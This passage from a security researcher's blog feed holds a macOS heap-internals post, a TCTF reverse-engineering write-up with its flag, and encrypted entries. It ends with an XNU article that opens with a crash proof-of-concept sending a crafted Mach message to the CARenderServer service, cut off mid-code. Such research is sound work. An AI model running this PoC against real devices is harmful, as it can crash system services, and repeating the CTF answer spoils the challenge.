NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX188V5MLvcqRJNjXJxfSTwWjl+WJ/crlWon4c5d1n2gXXWY7wg/ye6Lz7c45lXZXO3oU03KKWGHZ6O/giN0sNVwLBkY+rJmXRK2RsEpZeJgjpvCnSIyIKmKfIM42usnRXPl87a0Qsdq2L7uEmxhMhD+kho/LGgbHJD955uXJywxPbhzZDPYaA3Ne5rLdTYbOlWdoAsxa2wJSf3uKEbjFz4GBYtn9i9njvwFVpRRa75e/0sdUolUfTdpG9JRfkyvMqTYX+qyu0GH6BtEhUCZ3ZKws/1TqHgrMsUKy7HZwdGInrXNY6/P3aX3GiMhuIfrf6X2yHlT1ROZtkwgZVxXSXSEKuS9oz59o+IJbfkI8tiYQ67y3muLhDUxLnVmn72VF0nCQ/TIiwxjUTfjwvDWYW8vz5CVfjtrBCjQwJKyy0qVaJtfTU6sHVD9AKxW9RM70esz7u8621eU5+jqNKqnBqeyA7E8mP99SBYjvOuy/CRDLXDlvKPm7OjC3xtsL5GinzSK0N95y725wBLcPPdrseMlhoSMRBOLHPs7mVdkh0dFIBDDiAxtdQ9ETmbGMrk9BOlEob5uuEWR1GZzPwMBAs9M21/R9XwvZVFg2IFamziVVGR4ZQUYzpZmR3mQkrJhNhqyri3vDcCzfQ2QkxUOoTCzhSJAfXthFxUHx8+X2DeOmn47esY96LkX1x5EhLv1JoOScG6LpebIfqzlkc9F3zV8o9++P6bnCnU6ePq/c8RIvRQNj720WdGSVdsLf0N3k4Pu1HroVplz+ptwi5bRTmTW638Euo5mwa2o8SbktOd5Yo+T6sk/yN5yXStvTWOY+q5dsdggJjcKBJDYc6YrbFKshdNu9CL+rwkwmH9rkL8XvwWZnst0rFlSEC7Tsp2p2PLnS1+elf4wvsr4NAuakQ34k/+i0qZKpO2z/MHGLLtDD8OjmUJrbHeeThJ29r5MFl3UxNLuqQiGSshiZWBRzTrZyIr5XX8cqYfHkHukZS6phLjp3M1eKJ7+0fxgyTfjRhxEHzKnz2dmTtPSL/u85vJpL1hrAgaQeCKAaO7Bj8sx2CRXpDikuruyVWG5L3bWjHGblIf6HpV4ZFMInWAkepUBx3VMtCDgxm4RLX8NVMN4cpaMNaWSUvqPQDaQllJzJR2UePR6hS8Hgd2g0AtFLvYuTsAtexBX9SKsaJRi51kNMumD1sXl0ngeGuPwyjob3uYUjTmLeqsesBvDY67U1S0UpEKCHOJK1+zbbr9kWx+CGAXTO8pgXDobkH8BvTbSZh94Spa/lvuxJAH3kWqLjz7J4rY/k9ODHPdvLrl4KHDc9JvhbwMX3Kt+0XCcAbQ9t/qpgvE0j6fwO1fm5pWyUgL0Gvhxls1vuzZM/cztKkEHT39Hi2laTqUeaUy3hRmSfIOkRp1lztok/fdR6WMofXpBcdfvGyM7Rao5hO2a4qgEPcjOOIAKaeAQQAALhuLTk4xrTLFAiF2KZ3vKusmBOg0XVRkmaF2sCzvHW7ahTAcmNvOB7CrrV6aQJmXB0MWhvTyAvkeayjp9UhCs3GdfVV8HJdWRxNvGOJuPU9b0e4GrKh51yvuwWD1W22Pd5d0D/2eizKL/SVdqNYllCS7MsN31BLDeO62CjYpFdxpo+yudsU6pzgXhCYWfsiqOQRJs4q5Kz/rTv0N3I2MUSjJ1oB84u36tRflnUXlPEYDwt4P1W615ycOxmwxqEiwWpB1JiSylXe+vEufTKHM/zd5l+xTtMwQsSvgIAS1mpKe2IaW1K2N7P+eCFl3uK352RrZuC9QIYhiv5MICzpGzGVnDxlZv5jHbI6TibPg2zJDrxMxTqt5kb5CiwHPGkA0OAr8I1M4nz/N749Kb4OrqXrVy1ANsGNIvfipNL3GMvaLkCdNvMLXh/7cxrDRwv1S0FgoYfUP4dJVwZ9CBVlu0sUHbt/IsdhcUoE1Zu1kvLXCJvx/Xm/PMX3DjNcNsYWiCuVVTvvmQqpS/Mbo7wZfwm+fLap2apEmVUttggj1JkkW7NSvmXG3OCeKFJykC9fhtgIbOhn1Cqg3KEBkzKU6FL+rhEBfnIocVwt/pWwYPcipPz2EoU1qnqcxVM93V+x5rPq1+8GIIvyl/9ve6pCsYVSQTjvTADQryeZLHv6P97vcihuIhktxmq8gMmYR+2UsnuGno/2K+BPlifwl8tkx15dbFgsYphnfP9E7sWmz8Y37espUqTAktkM3D0FLMR275d2Eq9x0YX+Nf8HbKKyC8DcE2Tw/gHlQGcNoeFzbW4MzM8A/jH+jXbdVGv3K0t1sfwf93OrGn7yH0qDohNvOZhQOC7BUukwN5AoRhSufXcqT8fGtuKg/E2FLWAbh9It5br1CeBZF4h8JLO83lR7Nu5Eaaj6UVhwlS6xiam2Bt/I8KJdsVw8yWttSd1/XDJeMcPEzD4cK5PM5RLZn/ilF4jRzNFE+skKEX8wJGptapJ9Tp1sgftAfKwgPxlpsODAoZTB9xDHn7zVrx7QOLeytEEyk0Co+DVR4DL79ut0qBifJSY0zegDWXP9J9wK3FvHH+isMuxAHUaVtY6iBYwWI5cTEQxnv2k47Vz5sMMNaO+k9iFz+NMy0IZ038t9Ca1hNBpEXX5KSzTUzVgnC1xw98xJGG94GRH4cUMnyBgS530G+jRDnRsGMQWEwhDxtYswNWR87BxAAG28By04ic4fA==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, 